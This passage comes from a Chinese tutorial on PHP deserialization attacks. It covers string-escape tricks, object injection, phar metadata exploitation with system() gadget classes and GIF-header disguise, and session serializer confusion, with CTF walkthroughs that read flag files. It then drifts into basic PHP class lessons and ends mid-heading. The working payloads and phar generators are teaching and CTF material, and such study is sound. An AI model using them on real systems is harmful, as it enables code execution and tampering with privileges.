$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

这一段程序的输出为：

```php
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

这个时候我们把这两个程序的输出拿出来对比一下：

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}  //未过滤
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //已过滤
```

可以看到已过滤字符串中的hacker与前面的字符长度不对应了

```php
s:5:"admin";
s:5:"hacker";
```

在这个时候，对于我们，在新建对象的时候，传入的admin就是我们的可控变量

接下来明确我们的目标：将isVIP变量的值修改为1

首先我们将我们的现有子串和目标子串进行对比：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
```

也就是说，我们要在admin这个可控变量的位置，注入我们的目标子串。

首先计算我们需要注入的目标子串的长度：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
//以上字符串的长度为47
```

因为我们需要逃逸的字符串长度为47，并且admin每次过滤之后都会变成hacker，也就是说每出现一次admin，就会多1个字符。

因此我们在可控变量处，重复47遍admin，然后加上我们逃逸后的目标子串，可控变量修改如下：

```php
adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```

完整代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
echo $a_seri;
echo '------------------------------------------------------------';
echo $a_seri_filter;
?>
```

输出结果为

```php
O:4:"user":3:{s:8:"username";s:282:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

我们可以数一下hacker的数量，一共是47个hacker，共282个字符，正好与前面282相对应。

后面的注入子串也正好完成了逃逸。

反序列化后，多余的子串会被抛弃

我们接着将这个序列化结果反序列化，然后将其输出，完整代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
$a_seri_filter_unseri = unserialize($a_seri_filter);

var_dump($a_seri_filter_unseri);
?>
```

程序输出如下：

```php
object(user)#2 (3) {
  ["username"]=>
  string(282) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

可以看到这个时候，isVIP这个变量就变成了1，反序列化字符逃逸的目的也就达到了。

例题

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class a
{
    public $uname;
    public $password;
    public function __construct($uname,$password)
    {
        $this->uname=$uname;
        $this->password=$password;
    }
    public function __wakeup()
    {
            if($this->password==='yu22x')
            {
                include('flag.php');
                echo $flag; 
            }
            else
            {
                echo 'wrong password';
            }
        }
    }
function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}
$uname=$_GET[1];
$password=1;
unserialize(filter(serialize(new a($uname,$password))));
?> wrong password
```

想办法把password='yu22x'传进去，payload为：

```php
FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}
```

### 过滤后字符变少

首先，和上面的主体代码还是一样，还是同一个class，与之有区别的是过滤函数中，我们将hacker修改为hack。

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('admin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

输出结果：

```php
O:4:"user":3:{s:8:"username";s:5:"hack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

同样比较一下现有子串和目标子串：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
```

因为过滤的时候，将5个字符删减为了4个，所以和上面字符变多的情况相反，随着加入的admin的数量增多，现有子串后面会缩进来。

计算一下目标子串的长度：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
//长度为47
```

再计算一下到下一个可控变量的字符串长度：

```php
";s:8:"password";s:6:"
//长度为22
```

因为每次过滤的时候都会少1个字符，因此我们先将admin字符重复22遍（这里的22遍不像字符变多的逃逸情况精确，后面可能会需要做调整）

完整代码如下：（这里的变量里一共有22个admin）

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

输出结果：

```php
O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

注意：PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。

这里我们需要仔细看一下s后面是110，也就是说我们需要读取到110个字符。从第一个引号开始，110个字符如下：

```php
hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"
```

也就是说123456这个地方成为了我们的可控变量，在123456可控变量的位置中添加我们的目标子串

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
```

完整代码为：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

输出：

```php
O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-ff5bd4c85172cc621f2cf80dcb2f7efc21929e7e.png)

选中部分一共有111个字符，

造成这种现象的原因是：替换之前我们目标子串的位置是123456，一共6个字符，替换之后我们的目标子串显然超过10个字符，所以会造成计算得到的payload不准确

解决办法是：多添加1个admin，这样就可以补上缺少的字符。

修改后代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

分析一下输出结果：

```php
O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

可以看到，这样就对了。

我们将对象反序列化然后输出，代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
$a_seri_filter_unseri = unserialize($a_seri_filter);

var_dump($a_seri_filter_unseri);
?>
```

得到结果：

```php
object(user)#2 (3) {
  ["username"]=>
  string(115) "hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:""
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

可以看到，这个时候isVIP的值也为1，也就达到了我们反序列化字符逃逸的目的了

**tips：数组逃逸闭合要加一个}，即用";}闭合**

# 三、对象注入

当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。对象注入类似于一个利用反序列化魔术方法进行变量覆盖的过程。

对象漏洞出现得满足两个前提

1、unserialize的参数可控。2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。

给出一个案例帮助理解

```php
<?php
class A{
    var $test = "y4mao";
    function __destruct(){
        echo $this->test;
    }
}
$a = 'O:1:"A":1:{s:4:"test";s:5:"maomi";}';
unserialize($a);
```

在脚本运行结束后便会调用_destruct函数，同时会覆盖test变量输出maomi

# 四、phar反序列化

phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、

安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程

序分布在一个文件中并从该文件中运行的方法。

## 1、phar文件结构

1、stub

一个供phar扩展用于识别的标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以

__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。

2、manifest

phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列

化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。

3、contents

被压缩文件的内容。

4、signature

签名，放在文件末尾

## 2、利用方法

可利用原因：

使用phar://伪协议解析phar文件时对meta-data进行反序列化操作

利用方法：

将要序列化的内容写入meta-data中，再使用phar伪协议进行反序列化。首先需要生成phar文件，

在php的配置文件中需要设置phar.readonly= Off。

```php
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$a = new A();
$a->a='ls';
$phar = new Phar("test.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

可以触发phar伪协议的函数包括：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-249275942d3ab93fe4484a29b0678bc313d87458.png)

但实际上只要调用了php_stream_open_wrapper的函数，都存在这样的问题。因此还有以下函数：

```php
exif
exif_thumbnail
exif_imagetype

gd
imageloadfont
imagecreatefrom

hash
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file

file / url
get_meta_tags
get_headers
mime_content_type

standard
getimagesize
getimagesizefromstring

finfo
finfo_file
finfo_buffer

zip
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');

Postgres
<?php
$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');

MySQL
LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
再配置一下mysqld。（非默认配置）
[mysqld]
local-infile=1
secure_file_priv=""
```

例题：

```php
<?php
//flag in flag.php
error_reporting(0);
highlight_file(__FILE__);
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
if(isset($_GET['file'])) {
    if(strstr($_GET['file'], "flag")) {
        die("Get out!");
    }
    echo file_get_contents($_GET['file']);
}

if(isset($_FILES['file'])) {
    mkdir("upload");
    $uuid = uniqid();
    $ext = explode(".", $_FILES["file"]["name"]);
    $ext = end($ext);
    move_uploaded_file($_FILES['file']['tmp_name'], "upload/".$uuid.".".$ext);
    echo "Upload Success! FilePath: upload/".$uuid.".".$ext;
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="load" />
</form>
</body>

</html>
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$a = new A();
$a->a='ls';
$phar = new Phar("test.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

上传后进行包含

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-e2680221ccfb0f09d1e055dadd093b2c98bac9cd.png)

```php
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$b = new A();
$b->a='cat flag.php';
$phar = new Phar("test4.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($b);//将自定义的meta-data存入manifest
$phar->addFromString("test4.txt", "test4");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-a8174e59e8ade8f4dca10d826a6181daaff99bfe.png)

查看源代码：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-91d6071b346ca0cb372b6d79b79a66847f28b676.png)

## 3、过滤绕过

### 当环境限制了phar不能出现在前面的字符里

```php
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

### 验证文件格式

php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

可以看到加了GIF89a文件头，从而使其伪装成gif文件：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-85f71b01da15bb5199904bc0015e826fe589e7f8.png)

# 五、session反序列化

## 1、序列化和反序列化session机制

在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。

当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。

除此之外，还需要知道session_start()这个函数已经这个函数所起的作用：

当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。

session 的存储机制php中的session中的内容不是放在内存中，而是以文件的方式来存储，存储方式由配置项session.save_handler来进行确定，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的。

常见的session存储路径：

```php
/var/lib/php5/sess_PHPSESSID
/var/lib/php7/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSED
```

php.ini中一些session配置：

```php
session.save_path="" --设置session的存储路径
session.save_handler=""–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.serialize_handler string–定义用来序列化/反序列化session的处理器名字。默认使用php
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-62a0b4877445b8104c19c7104afdcf1e03e8d242.png)

## 2、session反序列化简单利用

session反序列化的漏洞是由三种不同的反序列化引擎所产生的的漏洞：

php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

php:存储方式是，键名+竖线+经过serialize()函数序列处理的值

php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值

三种引擎的存储格式：

```php
php : a|s:3:"wzk";
php_serialize : a:1:{s:1:"a";s:3:"wzk";}
php_binary : as:3:"wzk";
```

样例源码

```php
<?php
//ini_set('session.serialize_handler', 'php');
ini_set("session.serialize_handler", "php_serialize");
//ini_set("session.serialize_handler", "php_binary");
session_start();
$_SESSION['lemon'] = $_GET['a'];
echo "";
var_dump($_SESSION);
echo "";
?>
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class student{
    var $name;
    var $age;
    function __wakeup(){
        echo "hello ".$this->name."!";
    }
}
?>
```

攻击思路：

首先访问1.php，在传入的参数最开始加一个'|'，由于1.php是使用php_serialize引擎处理，因此只会把'|'当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到'|'时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。

这里可能会有一个小疑问，为什么在解析session文件时直接对'|'后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-08b434c44670c2b26d570add08ec6fa262f25e0f.png)

首先生成一个payload：

```php
<?php
    class student{
        var $name;
        var $age;
    }
    $a = new student();
    $a->name =  "daye";
    $a->age = "100";
    echo serialize($a);
?>

#O:7:"student":2:{s:4:"name";s:4:"daye";s:3:"age";s:3:"100";}
```

攻击思路中说到了因为不同的引擎会对'|'，产生歧义，所以在传参时在payload前加个'|'，作为a参数

payload:

```php
|O:7:"student":2:{s:4:"name";s:4:"daye";s:3:"age";s:3:"100";}
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-30de38b3350b1a1a25c800b380534da07ff68659.png)

访问1.php,查看一下本地session文件，发现payload已经存入到session文件

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-c7ba4a75c56064f16f538adc81581b0c6dcafac3.png)

php_serialize引擎传入的payload作为lemon对应值，而php则完全不一样：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9ea4fc3715fc7d27d330a5045f1b7cca4d39de4e.png)

访问一下2.php看看会有什么结果

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-92724c49e49b5530469270bf45a67505cff6f1eb.png)

成功触发了student类的__wakeup()方法,所以这种攻击思路是可行的。

## 3、利用session.upload_progress进行反序列化攻击

在PHP中还存在一个upload_process机制，即自动在$_SESSION中创建一个键值对，值中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用session实时返回上传的进度。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-c883077e526b1a806c4fef00026f787bd4d38598.png)

当题目中没有上面类似于PHP1写入$_SESSION全局变量时，可以利用session.upload_progress进行反序列化攻击。这种攻击方法与上一部分基本相同，不过这里需要先上传文件，同时POST一个与session.upload_process.name的同名变量（一般为PHP_SESSION_UPLOAD_PROGRESS）。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。下次请求就会反序列化session文件，从中取出这个键。所以攻击点还是跟上一部分一模一样，程序还是使用了不同的session处理引擎。

例题：Jarvis OJ——PHPINFO

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-a82988940d4a6f9ac06881ff9f811bbb1935091c.png)

当我们随便传入一个值时，便会触发__construct()魔法函数，从而出现phpinfo页面，在phpinfo页面发现

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-7396930f35f4c2da0ab757ac7ab8cdec74385683.png)

发现默认的引擎是php-serialize，而题目所使用的引擎是php，因为反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。

通过POST方法来构造数据传入$_SESSION，首先构造POST提交表单

```php
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9b26214ea64d1972758b9302fc36aeb33a65c83e.png)

接下来构造序列化payload

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='payload';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

将payload改为如下代码：

```php
print_r(scandir(dirname(__FILE__)));
#scandir目录中的文件和目录
#dirname函数返回路径中的目录部分
#__FILE__   php中的魔法常量,文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名
#序列化后的结果
O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
```

为防止双引号被转义，在双引号前加上\，除此之外还要加上|

```php
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

在这个页面随便上传一个文件，然后抓包修改filename的值

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-e840440de7e2b36c1eaa52bf6e41964f58291c6b.png)

可以看到Here_1s_7he_fl4g_buT_You_Cannot_see.php这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-5d82f9025f8b43eee600ff234d4018b6aa4bfb58.png)

$_SERVER['SCRIPT_FILENAME'] 也是包含当前运行脚本的路径，与 $_SERVER['SCRIPT_NAME'] 不同的

既然知道了路径，就继续构造payload即可

```php
print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));
#file_get_contents() 函数把整个文件读入一个字符串中。
```

接下来的就还是序列化然后改一下格式传入即可

## PHP 类和对象基础

### 基础概念

类是对一个类别的抽象概念，而具体的则是对象，比如汽车就是一个类

而对象则是`我的宝马` , 而不是`宝马` , 宝马也是一个类，对象是一个具体到每个事物

PHP 官方解释: **类是对象的抽象，对象是类的具像 (具体对象)**

如何创建一个类：

使用 `class` 关键字进行创建，`Class ClassName{}`

```
php
<?php 
class Car {
    // 这里是类的内容
}
>
```

**类名的命名规范:** 类名通常使用大驼峰命名法。
例如: `persontest` 的大驼峰命名法就是 `PersonTest` 小驼峰命名法就是 `personTest`。

### 类中的成员

- **成员属性** (在类中定义的变量称之为属性)
- **方法** (在类中定义的函数称之为方法)
- **成员常量**

### 创建一个类

```
php
<?php 
class Demo {
    public $username = 'x1ong';
    public $password = "admin@123";

    public function login() {
        echo "正在执行登陆操作...";
    }
}

$obj = new Demo; // 初始化或叫实例化 Demo 这个类
$obj->login();  // 执行对象中的 login 方法。
?>
```

### 类的继承

#### 继承的好处

- 子类继承了父类，那么就拥有了父类可以有的属性和方法 (子承父业)。
- 子类拥有父亲的所有可以拿到的属性，还有自己独特的属性。

#### 继承的语法

```
php
class SubClassName extends PrentClassName {}
```

#### 继承示例

```
php

<?php 
class ParentClass {
    public $money = '1000000000000000000.0';
    
    public function run() {
        echo " 成为富豪";
    }
}

class SubClass extends ParentClass {

}

$obj = new SubClass;
echo $obj->money;
$obj->run();
?>
```

[![alt text](https://image.3001.net/images/20240325/1711368443_660168fb5f2854628a93f.png)](https://image.3001.net/images/20240325/1711368443_660168fb5f2854628a93f.png)

可以看到，子类 `SubClass` 并没有定义 `money` 属性和 `run` 方法，但是可以调用其属性和方法，这就是继承。

### 类的访问权限

类的访问权限一般指的是成员属性和成员方法的访问权限，如下:

| 权限        | 说明     | 外部访问 | 类内部访问 | 被继承 |
| ----------- | -------- | -------- | ---------- | ------ |
| `public`    | 公有的   | true     | true       | true   |
| `protected` | 受保护的 | false    | true       | true   |
| `private`   | 私有的   | false    | true       | false  |

```
php

<?php 
// 父类
class Person {
    public $name = 'x1ong';
    protected $id = '41282820020327xxxx';
    private $position = '计算机从业人员';
}
// SubPerson继承父类Proson 
class SubPerson extends Person {
    function __construct() {
        // public 可以在外部访问、类内部访问、被继承
        echo '我父亲的名字为: ' . $this->name . PHP_EOL;
        // protected 可以在类内部访问,可以被继承,不能在类外部访问
        echo '我父亲的身份证号为: ' . $this->id . PHP_EOL;
        // provate 只能在类的内部访问,不可以被继承,不可以在类外部访问。 
        // echo '我父亲的职位为: ' . $this->position . PHP_EOL;

    }
}

$obj = new SubPerson;
// 外部访问public 可以
echo $obj->name;

// 外部访问protected 不可以
echo $obj->id;

// 外部访问private 不可以
// echo $obj->position;

?>
```

## 魔术方法

PHP 的魔术方法（Magic Methods）是一些特殊的方法，它们在对象的生命周期中具有特殊的行为。这些方法以**两个下划线**开头，如`__construct()`、`__destruct()`、`__get()`、`__set()` 等。这些方法被称为 “魔术方法”，**因为它们在特定的时机自动调用，而不需要显式调用**。

### __construct()

| 触发条件                                 | 参数                                 |
| ---------------------------------------- | ------------------------------------ |
| 构造函数，当当前类被实例化的时候自动调用 | 任意长度的参数，常用于初始化属性的值 |

```
php

<?php 
class Demo {
    public $name;
    public $age;
    public $gender;

    function __construct($name,$age,$gender) {
        // 属性初始化
        $this->name = $name;
        $this->age = $age;
        $this->gender = $gender;
    } 
}

$obj = new Demo('xiaoming',17,'male'); // 实例化(初始化)类
echo $obj->name;
echo $obj->age;
echo $obj->gender;
?>
```

### __destruct()

| 触发条件                                                     | 参数   |
| ------------------------------------------------------------ | ------ |
| 析构函数，在对象的所有引用被删除或者当对象被销毁时执行的魔术方法。 | 无参数 |

```
php

<?php 
class Demo {
    function msg() {
        echo ' 这是一条无用的信息 ';
    }

    function __destruct() {
        echo ' 我是__destruct()执行的内容 ';
    }
}

$obj = new Demo; // 执行1次
$obj->msg();
echo ' helloworld ';

// 序列化和反序列化
$ser = serialize($obj);
unserialize($ser); // 执行2次
?>
```

### __wekeup()

